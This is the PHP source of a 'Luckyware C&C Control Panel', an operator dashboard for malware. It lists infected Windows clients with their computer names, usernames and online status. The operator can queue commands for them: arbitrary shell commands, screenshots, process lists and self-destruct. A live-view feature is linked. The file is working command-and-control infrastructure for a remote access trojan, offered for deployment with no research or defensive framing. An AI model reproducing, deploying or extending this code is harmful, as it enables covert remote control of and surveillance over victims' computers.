<?php
// Luckyware C&C Control Panel
// Upload this to your InfinityFree website root directory
session_start();

// Authentication (CHANGE THESE!)
$ADMIN_USERNAME = 'admin';
$ADMIN_PASSWORD = 'change_this_password_123';

// Database configuration - PostgreSQL (Neon)
$db_host = getenv('PGHOST');
$db_name = getenv('PGDATABASE');
$db_user = getenv('PGUSER');
$db_pass = getenv('PGPASSWORD');

// Handle login
if(isset($_POST['login'])) {
    if($_POST['username'] == $ADMIN_USERNAME && $_POST['password'] == $ADMIN_PASSWORD) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Invalid credentials!";
    }
}

// Handle logout
if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: index.php');
    exit;
}

// Check if logged in
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Luckyware C&C - Login</title>
        <style>
            body { font-family: Arial; background: #1a1a2e; color: #eee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #16213e; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
            input { display: block; margin: 10px 0; padding: 10px; width: 250px; border: none; border-radius: 5px; }
            button { background: #0f4c75; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
            button:hover { background: #3282b8; }
            .error { color: #ff6b6b; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Luckyware C&C</h2>
            <?php if(isset($error)) echo "<p class='error'>$error</p>"; ?>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Connect to database
try {
    $pdo = new PDO("pgsql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Database connection failed!");
}

// Handle command submission
if(isset($_POST['send_command'])) {
    $client_id = $_POST['client_id'];
    $command_type = $_POST['command_type'];
    $command_data = $_POST['command_data'];
    
    $stmt = $pdo->prepare("INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES (?, ?, ?, 'pending', NOW())");
    $stmt->execute([$client_id, $command_type, $command_data]);
    
    $success_msg = "Command sent successfully!";
}

// Get all clients
$stmt = $pdo->query("SELECT * FROM clients ORDER BY last_seen DESC");
$clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Auto-refresh every 10 seconds
?>
<!DOCTYPE html>
<html>
<head>
    <title>Luckyware C&C Control Panel</title>
    <meta http-equiv="refresh" content="10">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e27; color: #eee; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { margin: 0; }
        .logout-btn { background: #ff6b6b; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-box { background: #16213e; padding: 20px; border-radius: 10px; text-align: center; }
        .stat-box h3 { color: #3282b8; margin-bottom: 10px; }
        .stat-box .number { font-size: 2em; font-weight: bold; }
        table { width: 100%; background: #16213e; border-radius: 10px; overflow: hidden; margin-bottom: 20px; }
        th { background: #0f4c75; padding: 15px; text-align: left; }
        td { padding: 12px 15px; border-bottom: 1px solid #1a1a2e; }
        tr:hover { background: #1a1a2e; }
        .status-online { color: #51cf66; font-weight: bold; }
        .status-offline { color: #ff6b6b; font-weight: bold; }
        .btn { background: #3282b8; color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; }
        .btn:hover { background: #0f4c75; }
        .btn-danger { background: #ff6b6b; }
        .btn-danger:hover { background: #ee5a52; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #16213e; padding: 30px; border-radius: 10px; max-width: 600px; width: 90%; }
        .modal-content h2 { margin-bottom: 20px; }
        .modal-content input, .modal-content select, .modal-content textarea { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #0f4c75; background: #0a0e27; color: #eee; border-radius: 5px; }
        .modal-content textarea { min-height: 100px; font-family: monospace; }
        .close { float: right; font-size: 28px; cursor: pointer; }
        .success { background: #51cf66; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 Luckyware C&C Control Panel</h1>
        <a href="?logout" class="logout-btn">Logout</a>
    </div>
    
    <?php if(isset($success_msg)): ?>
        <div class="success"><?= $success_msg ?></div>
    <?php endif; ?>
    
    <div class="stats">
        <div class="stat-box">
            <h3>Total Clients</h3>
            <div class="number"><?= count($clients) ?></div>
        </div>
        <div class="stat-box">
            <h3>Online Now</h3>
            <div class="number"><?= count(array_filter($clients, function($c) { return strtotime($c['last_seen']) > time() - 60; })) ?></div>
        </div>
        <div class="stat-box">
            <h3>Pending Commands</h3>
            <div class="number"><?= $pdo->query("SELECT COUNT(*) FROM commands WHERE status='pending'")->fetchColumn() ?></div>
        </div>
    </div>
    
    <h2>Connected Clients</h2>
    <table>
        <thead>
            <tr>
                <th>Client ID</th>
                <th>Computer</th>
                <th>Username</th>
                <th>Windows</th>
                <th>First Seen</th>
                <th>Last Seen</th>
                <th>Status</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach($clients as $client): ?>
            <?php
                $is_online = strtotime($client['last_seen']) > time() - 60;
                $status_class = $is_online ? 'status-online' : 'status-offline';
                $status_text = $is_online ? '🟢 Online' : '🔴 Offline';
            ?>
            <tr>
                <td><code><?= htmlspecialchars($client['client_id']) ?></code></td>
                <td><?= htmlspecialchars($client['computer_name']) ?></td>
                <td><?= htmlspecialchars($client['username']) ?></td>
                <td><?= htmlspecialchars($client['windows_version']) ?></td>
                <td><?= date('Y-m-d H:i:s', strtotime($client['first_seen'])) ?></td>
                <td><?= date('Y-m-d H:i:s', strtotime($client['last_seen'])) ?></td>
                <td class="<?= $status_class ?>"><?= $status_text ?></td>
                <td>
                    <a href="#" class="btn" onclick="showCommandModal('<?= $client['client_id'] ?>')">Send Command</a>
                    <a href="view_client.php?id=<?= $client['id'] ?>" class="btn">View Details</a>
                    <a href="live_view.php?client_id=<?= $client['id'] ?>" class="btn" style="background: #51cf66;">🎥 Live View</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    
    <!-- Command Modal -->
    <div id="commandModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeCommandModal()">&times;</span>
            <h2>Send Command</h2>
            <form method="POST">
                <input type="hidden" name="client_id" id="modal_client_id">
                
                <label>Command Type:</label>
                <select name="command_type" id="command_type" onchange="updateCommandData()">
                    <option value="shell">Shell Command</option>
                    <option value="sysinfo">Get System Info</option>
                    <option value="processes">List Processes</option>
                    <option value="screenshot">Take Screenshot</option>
                    <option value="exit">Exit (No Self-Destruct)</option>
                    <option value="selfdestruct">Self-Destruct</option>
                </select>
                
                <label>Command Data:</label>
                <textarea name="command_data" id="command_data" placeholder="Enter command data..."></textarea>
                
                <button type="submit" name="send_command" class="btn" style="width: 100%; margin-top: 10px;">Send Command</button>
            </form>
        </div>
    </div>
    
    <script>
        function showCommandModal(clientId) {
            document.getElementById('modal_client_id').value = clientId;
            document.getElementById('commandModal').style.display = 'flex';
            updateCommandData();
        }
        
        function closeCommandModal() {
            document.getElementById('commandModal').style.display = 'none';
        }
        
        function updateCommandData() {
            var commandType = document.getElementById('command_type').value;
            var commandData = document.getElementById('command_data');
            
            commandData.disabled = false;
            commandData.placeholder = "Enter command data...";
            
            if(commandType === 'shell') {
                commandData.placeholder = "Example: dir C:\\ or whoami";
            } else if(commandType === 'sysinfo' || commandType === 'processes' || commandType === 'screenshot' || commandType === 'exit' || commandType === 'selfdestruct') {
                commandData.value = '';
                commandData.disabled = true;
            }
        }
    </script>
</body>
</html>
